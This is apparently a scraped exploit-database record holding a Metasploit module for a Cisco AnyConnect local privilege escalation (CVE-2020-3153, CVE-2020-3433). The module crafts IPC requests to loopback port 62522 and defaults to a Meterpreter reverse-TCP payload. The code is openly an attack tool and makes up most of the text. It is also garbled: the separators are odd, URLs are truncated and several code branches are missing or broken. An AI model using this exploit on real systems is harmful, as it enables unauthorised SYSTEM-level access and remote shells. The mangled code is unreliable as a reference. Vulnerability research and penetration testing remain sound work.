{
    "text": "vul_name : Cisco AnyConnect Privilege Escalation ， vul_cve : CVE-2020-3433 , CVE-2020-3153 , CVE-2020-3434 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Local ， Rank = ExcellentRanking ， include Msf : Post : Windows : Priv ， include Msf : Post : Windows : FileInfo ， include Msf : Post : File ， include Msf : Exploit : EXE ， include Msf : Exploit : FileDropper ， super (  ， update_info (  ， info ,  ， 'Name' => 'Cisco AnyConnect Privilege Escalations ( CVE-2020-3153 and CVE-2020-3433 ) ' ,  ， 'Description' => %q{ ， The installer component of Cisco AnyConnect Secure Mobility Client for Windows ， prior to 4.8.02042 is vulnerable to path traversal and allows local attackers ， to create/overwrite files in arbitrary locations with system level privileges. ， The installer component of Cisco AnyConnect Secure Mobility Client for Windows ， prior to 4.9.00086 is vulnerable to a DLL hijacking and allows local attackers ， to execute code on the affected machine with with system level privileges. ， Both attacks consist in sending a specially crafted IPC request to the TCP ， port 62522 on the loopback device , which is exposed by the Cisco AnyConnect ， Secure Mobility Agent service. This service will then launch the vulnerable ， installer component ( `vpndownloader` )  , which copies itself to an arbitrary ， location ( CVE-2020-3153 ) or with a supplied DLL ( CVE-2020-3433 ) before being ， executed with system privileges. Since `vpndownloader` is also vulnerable to DLL ， hijacking , a specially crafted DLL ( `dbghelp.dll` ) is created at the same ， location `vpndownloader` will be copied to get code execution with system ， privileges. ， The CVE-2020-3153 exploit has been successfully tested against Cisco AnyConnect ， Secure Mobility Client versions 4.5.04029 , 4.5.05030 and 4.7.04056 on Windows 10 ， version 1909 ( x64 ) and Windows 7 SP1 ( x86 )  ; the CVE-2020-3434 exploit has been ， successfully tested against Cisco AnyConnect Secure Mobility Client versions ， 4.5.02036 , 4.6.03049 , 4.7.04056 , 4.8.01090 and 4.8.03052 on Windows 10 version ， 1909 ( x64 ) and 4.7.4056 on Windows 7 SP1 ( x64 ) . ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => ，  [  ， 'Yorick Koster' ,  # original PoC CVE-2020-3153 , analysis ， 'Antoine Goichot ( ATGO ) ' ,  # PoC CVE-2020-3153 , original PoC for CVE-2020-3433 , update of msf module ， 'Christophe De La Fuente' # msf module for CVE-2020-3153 ，  ]  ,  ， 'Platform' => 'win' ,  ， 'Arch' => [ ARCH_X86 , ARCH_X64 ]  ,  ， 'SessionTypes' => [ 'meterpreter' ]  ,  ， 'Targets' => [  ，  [  ， 'Windows x86/x64 with x86 payload' ,  ， { ， 'Arch' => ARCH_X86 ， } ，  ]  ，  ]  ,  ， 'Privileged' => true ,  ， ' ，  [  ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'CVE' , '2020-3153' ]  ,  ，  [ 'URL' , ' ，  [ 'CVE' , '2020-3433' ]  ，  ]  ,  ， 'DisclosureDate' => 'Aug 05 2020' ,  ， 'DefaultTarget' => 0 ,  ， 'DefaultOptions' => { ， 'PAYLOAD' => 'windows/meterpreter/reverse_tcp' ,  ， 'FileDropperDelay' => 10 ， } ， register_options [  ， OptString.new ( 'INSTALL_PATH' ,  [  ， false ,  ， 'Cisco AnyConnect Secure Mobility Client installation path ( where \\'vpndownloader.exe\\'\\ ， ' should be found ) . It will be automatically detected if not set.' ，  ]  )  ,  ， OptEnum.new ( 'CVE' ,  [ true , 'Vulnerability to use' , 'CVE-2020-3433' ,  [ 'CVE-2020-3433' , 'CVE-2020-3153' ]  )  ，  ]  ， register_advanced_options [  ， OptBool.new ( 'ForceExploit' ,  [ false , 'Override check result' , false ]  )  ，  ]  ， end ，  # See AnyConnect IPC protocol articles :  ， class CIPCHeader < BinData : Record ， endian : little ， uint32 : id_tag , label : 'ID Tag' , value : 0x4353434f ， uint16 : header_length , label : 'Header Length' , initial_value : -> { num_bytes } ， uint16 : data_length , label : 'Data Length' , initial_value : -> { parent.body.num_bytes } ， uint32 : ipc_repsonse_cb , label : 'IPC response CB' , initial_value : 0xFFFFFFFF ， uint32 : msg_user_context , label : 'Message User Context' , initial_value : 0x00000000 ， uint32 : request_msg_id , label : 'Request Message Id' , initial_value : 0x00000002 ， uint32 : return_ipc_object , label : 'Return IPC Object' , initial_value : 0x00000000 ， uint8 : message_type , label : 'Message Type' , initial_value : 1 ， uint8 : message_id , label : 'Message ID' , initial_value : 2 ， end ， class CIPCTlv < BinData : Record ， endian : big ， uint8 : msg_type , label : 'Type' ， uint8 : msg_index , label : 'Index' ， uint16 : msg_length , label : 'Length' , initial_value : -> { msg_value.num_bytes } ， stringz : msg_value , label : 'Value' , length : -> { msg_length } ， end ， class CIPCMessage < BinData : Record ， endian : little ， cipc_header : header , label : 'Header' ， array : body , label : 'Body' , type :  : cipc_tlv , read_until :  : eof ， end ， def detect_path ， program_files_paths = Set.new (  [ get_env ( 'ProgramFiles' )  ]  )  ， program_files_paths get_env ( 'ProgramFiles ( x86 ) ' )  ， path = 'Cisco\\Cisco AnyConnect Secure Mobility Client' ， program_files_paths.each do | program_files_path |  ， next unless file_exist? (  [ program_files_path , path , 'vpndownloader.exe' ] .join ( '\\' )  ， end ， nil ， end ， path = path.strip ， loop do ， path.chop !  ， end ， path ， end ， def check ， install_path = sanitize_path ( datastore [ 'INSTALL_PATH' ]  )  ， vprint_status ( \"Skipping installation path detection and use provided path :  # {install_path}\" )  ，  @ installation_path = file_exist? (  [ install_path , 'vpndownloader.exe' ] .join ( '\\' ) ? install_path : nil ， vprint_status ( 'Try to detect installation path.' )  ，  @ installation_path = detect_path ， end ， unless @ installation_path ， end ， file_path = \" # { @ installation_path}\\vpndownloader.exe\" ， vprint_status ( \"Found vpndownloader.exe path : ' # {file_path}'\" )  ， version = file_version ( file_path )  ， unless version ， end ， cve_2020_3153 = ( datastore [ 'CVE' ] = 'CVE-2020-3153' )  ， patched_version_cve_2020_3153 = Gem : Version.new ( '4.8.02042' )  ， patched_version_cve_2020_3433 = Gem : Version.new ( '4.9.00086' )  ，  @ ac_version = Gem : Version.new ( version.join ( '.' )  ， elsif (  @ ac_version < patched_version_cve_2020_3433 )  ! cve_2020_3153 ， elsif (  @ ac_version < patched_version_cve_2020_3433 ) cve_2020_3153 ， end ， end ， def exploit ， fail_with ( Failure : None , 'Session is already elevated' ) if is_system? ， fail_with ( Failure : None , 'Payload architecture is not compatible with this module. Please , select an x86 payload' )  ， end ， check_result = check ， print_status ( check_result.message ) ",
    "time": "2020.09.30"
}